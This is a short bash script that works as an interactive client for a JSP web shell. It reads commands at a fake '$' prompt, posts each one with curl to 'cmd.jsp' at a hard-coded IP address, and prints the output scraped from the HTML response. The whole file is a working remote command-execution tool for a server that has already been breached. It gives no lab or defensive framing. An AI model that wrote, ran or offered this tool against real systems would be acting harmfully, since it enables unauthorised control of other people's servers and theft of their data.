#!/bin/bash

while :; do
    echo -n "$ "
    read query
    curl -s "http://104.131.43.243:8080/cmd/cmd.jsp" --data-urlencode "cmd=$query" | awk '/<BR>/ { show=1 } show; /<\/pre>/ { show=0 }' | sed -e '$d' -e "1d"
done
